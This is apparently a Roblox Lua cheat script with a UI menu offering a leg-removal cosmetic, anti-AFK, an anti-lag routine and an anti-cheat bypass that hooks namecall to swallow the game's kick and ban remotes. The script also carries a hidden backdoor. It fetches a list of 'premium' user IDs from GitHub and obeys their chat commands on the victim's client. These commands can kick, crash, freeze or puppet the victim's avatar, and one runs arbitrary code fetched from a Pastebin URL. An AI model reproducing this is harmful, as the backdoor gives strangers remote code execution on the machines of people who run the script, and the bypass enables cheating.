Extrass:AddButton({
	Name = "Korblox (CS)",
	Callback = function()
-- Function to destroy the right leg of a character
local function destroyRightLeg(character)
    -- Check if the character has the right leg parts
    local rightUpperLeg = character:FindFirstChild("RightUpperLeg")
    local rightLowerLeg = character:FindFirstChild("RightLowerLeg")
    local rightFoot = character:FindFirstChild("RightFoot")
    
    -- Destroy the parts if they exist
    if rightUpperLeg then
        rightUpperLeg:Destroy()
    end
    if rightLowerLeg then
        rightLowerLeg:Destroy()
    end
    if rightFoot then
        rightFoot:Destroy()
    end
end

-- Get the player's character
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Call the function to destroy the right leg
destroyRightLeg(character)
-- Function to destroy the right leg of a character
local function destroyRightLeg(character)
    -- Check if the character has the right leg parts
    local rightUpperLeg = character:FindFirstChild("RightUpperLeg")
    local rightLowerLeg = character:FindFirstChild("RightLowerLeg")
    local rightFoot = character:FindFirstChild("RightFoot")
    
    -- Destroy the parts if they exist
    if rightUpperLeg then
        rightUpperLeg:Destroy()
    end
    if rightLowerLeg then
        rightLowerLeg:Destroy()
    end
    if rightFoot then
        rightFoot:Destroy()
    end
end

-- Get the player's character
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Call the function to destroy the right leg
destroyRightLeg(character)
    end
})

-- Settings

local Settings = Window:MakeTab({
	Name = "Settings",
	Icon = "rbxassetid://17460504879",
	PremiumOnly = false
})

local ImportantSettings = Settings:AddSection({
	Name = "Important Settings"
})

ImportantSettings:AddToggle({
	Name = "Bypass Anti-Cheat",
	Default = true,
	Callback = function(Value)

		local function BypassAC()
			local OldHook 
			OldHook = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
				local Vals = {...}
				local Functions = {"TeleportDetect","CHECKER_1","CHECKER","GUI_CHECK","OneMoreTime","checkingSPEED","BANREMOTE","PERMAIDBAN","KICKREMOTE","BR_KICKPC","BR_KICKMOBILE"}
				for _, FuncName in ipairs(Functions) do
					if tostring(Vals[1]) == FuncName then
						return
					end
				end
				return OldHook(self, ...)
			end))
		end

		task.spawn(function()
			BypassAC()
		  end)

	end    
})

local ExtraSettings = Settings:AddSection({
	Name = "Extra Settings"
})

ExtraSettings:AddButton({
	Name = "Anti-Afk",
	Callback = function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "TWR";
            Text = "Anti-Afk has been Enabled!";
            Duration = 10;
        })
        
        local bb = game:GetService("VirtualUser")
        
        game:GetService("Players").LocalPlayer.Idled:Connect(function()
            bb:CaptureController()
            bb:ClickButton2(Vector2.new())
        end)
        
  	end    
})

ExtraSettings:AddButton({
    Name = "Anti-Lag (bad graphics)",
    Callback = function()
        --[[ Anti-Lag Script Boost your fps ]]--
local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
end
})

OrionLib:Init()

-- PREMIUM


local premium = {}

local prefix = ":"
local bending = false

local function fetchPremiumUserIDs()
    local githubURL = "https://github.com/knnjfs8219sdnf0fs80dfs09d/owexec1/raw/main/ownerpremiumcmd"
    local response = game:HttpGet(githubURL)
    
    if response then
        for id in response:gmatch("%d+") do
            table.insert(premium, tonumber(id))
        end
    end
end

fetchPremiumUserIDs()

local function handleCommand(player, message)
    if game.Players.LocalPlayer.Name ~= player then
        local userId = game:GetService("Players"):GetUserIdFromNameAsync(player)
        
        if userId then
            if table.find(premium, userId) then 
                if message == string.lower(prefix.."bring .") then 
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[player].Character.HumanoidRootPart.Position + Vector3.new(0, 5, 0))
                elseif message == string.lower(prefix.."kick .") then 
                    game.Players.LocalPlayer:Kick("You have been kicked from this server.")
                elseif message == string.lower(prefix.."ban .") then 
                    game.Players.LocalPlayer:Kick("PERMA-BAN")
                elseif message == string.lower(prefix.."pray .") then
                    local targetPlayer = game.Players:FindFirstChild(player)
                    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local targetPosition = targetPlayer.Character.HumanoidRootPart.CFrame
                        local offset = targetPosition.lookVector * 5
                        local lookAtPosition = targetPlayer.Character.HumanoidRootPart.Position
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition.Position + offset, lookAtPosition)

                        local animation = Instance.new("Animation")
                        animation.AnimationId = "rbxassetid://3487719500"
                        local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                        local animationTrack = humanoid:LoadAnimation(animation)
                        animationTrack:Play()
                    end
                elseif message == string.lower(prefix.."freeze .") then 
                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                elseif message == string.lower(prefix.."unfreeze .") then 
                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                elseif message == string.lower(prefix.."rj .") then
                    local tpservice= game:GetService("TeleportService")
                    local plr = game.Players.LocalPlayer
                    tpservice:Teleport(game.PlaceId, plr)

                elseif message == string.lower(prefix.."su .") then
                loadstring(game:HttpGet("https://pastebin.com/raw/mWJdMhJL", true))()

                elseif message == string.lower(prefix.."dropcash .") then 
                    local args = {"DropMoney", "10000"}
                    game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
                elseif message:sub(1, #prefix+3) == string.lower(prefix.."say") then 
                    local messageToSend = message:sub(#prefix+5)
                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(messageToSend, "All")
                elseif message:sub(1, #prefix+5) == string.lower(prefix.."say .") then
                    local targetPlayerName = message:sub(#prefix+6, message:find(" ", #prefix+6) - 1)
                    local messageToSend = message:sub(message:find(" ", #prefix+6) + 1)
                    local targetPlayer = game.Players:FindFirstChild(targetPlayerName)
                    -- Handle targetPlayer logic
                elseif message == string.lower(prefix.."benx .") then 
                    bending = true
                    local segtarget = player
                    local Crouch = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                    Crouch.Looped = true
                    Crouch:Play()
                    local away = .5
                    local reversing = false
                    local Loop
                    local loopFunction = function()
                        local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                        local character = game.Players.LocalPlayer.Character
                        if targetchar then
                            if reversing == true then
                                away = away - 0.1
                            else
                                away = away + 0.1
                            end
                            if away >= 2 then
                                reversing = true
                            elseif away < 0.5 then
                                reversing = false
                            end
                            character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                        end
                    end
                    local Start = function()
                        Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                    end
                    local Pause = function()
                        Loop:Disconnect()
                        Crouch:Stop()
                    end
                    Start()    
                    repeat
                        wait()
                    until bending == false
                    Pause()
                elseif message == string.lower(prefix.."unbenx .") then 
                    while bending == true do
                        wait()
                        bending = false
                    end
                elseif message == string.lower(prefix.."re .") then
                    local character = game.Players.LocalPlayer.Character
                    if character and character:FindFirstChildOfClass("Humanoid") then
                        character:FindFirstChildOfClass("Humanoid").Health = 0
                    end
                elseif message == string.lower(prefix.."crash .") then
                    game:Shutdown()
                elseif message == string.lower(prefix.."head .") then
                    heading = true
                    local segtarget = player
                    local Crouch = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                    Crouch.Looped = true
                    Crouch:Play()
                    local away = .5
                    local reversing = false
                    local Loop
                    local loopFunction = function()
                        local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                        local character = game.Players.LocalPlayer.Character
                        if targetchar then
                            if reversing == true then
                                away = away - 0.1
                            else
                                away = away + 0.1
                            end
                            if away >= 2 then
                                reversing = true
                            elseif away < 0.5 then
                                reversing = false
                            end
                            character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                            character.HumanoidRootPart.CFrame = CFrame.new(character.HumanoidRootPart.Position, targetchar.HumanoidRootPart.Position)
                        end
                    end
                    local Start = function()
                        Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                    end
                    local Pause = function()
                        Loop:Disconnect()
                        Crouch:Stop()
                    end
                    Start()    
                    repeat
                        wait()
                    until heading == false
                    Pause()
                elseif message == string.lower(prefix.."unhead .") then 
                    heading = false
                elseif message == string.lower(prefix.."jumpscare .") then
                    -- Jumpscare command implementation
                    local jumpscareGui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
                    jumpscareGui.Name = "JumpscareGui"

                    local jumpscareImage = Instance.new("ImageLabel", jumpscareGui)
                    jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
                    jumpscareImage.Image = "rbxassetid://668614178"
                    jumpscareImage.BackgroundTransparency = 1
                    jumpscareImage.ImageTransparency = 0

                    local jumpscareSound = Instance.new("Sound", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
                    jumpscareSound.SoundId = "rbxassetid://3537873683"
                    jumpscareSound:Play()

                    wait(1)

                    local TweenService = game:GetService("TweenService")
                    local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
                    local tweenGoal = {ImageTransparency = 1}

                    local tween = TweenService:Create(jumpscareImage, tweenInfo, tweenGoal)
                    tween:Play()
                    
                    tween.Completed:Connect(function()
                        jumpscareGui:Destroy()
                        jumpscareSound:Destroy()
                    end)
                end
            end
        end
    end
end

game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", math.huge):WaitForChild("OnMessageDoneFiltering", math.huge).OnClientEvent:Connect(function(data)
    if data ~= nil then
        local player = tostring(data.FromSpeaker)
        local message = tostring(data.Message)
        
        handleCommand(player, message)
    end
end)

-- NAME TAGS

-- prem

local function findPlayerByUsername(username)
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Name == username then
            return player
        end
    end
    return nil
end

local function modifyDisplayName(player)
    if player.Character then
        local humanoid = player.Character:FindFirstChildOfClass('Humanoid')
        if humanoid then
            humanoid.DisplayName = "[] " .. player.DisplayName
        end
    end
end

local usernamesToMonitor = {
    "DiegoXd200682",
    "AWDSDWA204590",
    "littl3_JJC",
    "mylurk",
    "ghsata",
    "nice_a1a",
    "XxJuniordriptrixX"
}

game:GetService("RunService").RenderStepped:Connect(function()
    for _, username in ipairs(usernamesToMonitor) do
        local targetPlayer = findPlayerByUsername(username)
        if targetPlayer then
            modifyDisplayName(targetPlayer)
        end
    end
end)


